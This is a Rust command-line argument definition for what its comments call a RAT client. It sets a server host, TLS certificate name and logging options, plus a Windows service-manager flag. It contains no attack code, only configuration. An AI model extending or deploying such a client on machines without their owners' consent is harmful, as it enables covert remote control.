use std::path::PathBuf;

use clap::{Parser, crate_description, crate_version};
use log::LevelFilter;

#[derive(Debug, Parser)]
#[command(
    long_about = crate_description!(),
    propagate_version = true,
    version = crate_version!(),
)]
pub struct Arguments {
    /// Host of the RAT server to connect to
    #[arg(long, default_value = "127.0.0.1:12110")]
    pub host: String,

    /// Expected server name in the TLS certificate (for certificate validation)
    #[arg(long, default_value = "localhost")]
    pub cert_server_name: String,

    /// The logging level
    #[arg(long, default_value_t = LevelFilter::Info)]
    pub log_level: LevelFilter,

    /// Path to the log file
    #[arg(long, default_value = "target/client.log")]
    pub log_path: PathBuf,

    /// Enable interaction with Windows Service Control Manager (SCM)
    #[cfg(windows)]
    #[arg(long)]
    pub scm: bool,
}
